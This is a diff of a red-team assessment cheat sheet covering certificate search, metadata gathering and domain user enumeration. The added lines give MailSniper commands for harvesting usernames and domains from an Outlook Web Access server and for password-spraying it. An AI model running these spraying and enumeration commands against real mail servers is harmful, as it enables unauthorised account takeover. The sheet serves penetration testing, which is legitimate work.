@@ -1,12 +1,21 @@
 # Red-Team and Infrastructure Assessments
-## Cert search
+### Cert search
 https://crt.sh
 `%.blah.com`
 
-## Metadata
+### Metadata
 `PS C:\> Invoke-PowerMeta -TargetDomain targetdomain.com`
 
 ## Domain User Enumeration
+
+### MailSniper
+
+#### Usernameharvest
+`Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt`
+#### Domainnameharvest
+`Invoke-DomainHarvestOWA -ExchHostname mail.domain.com` 
+#### OWA Spray
+`Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt`
 
 ### Grab employee names from Linkedin
 
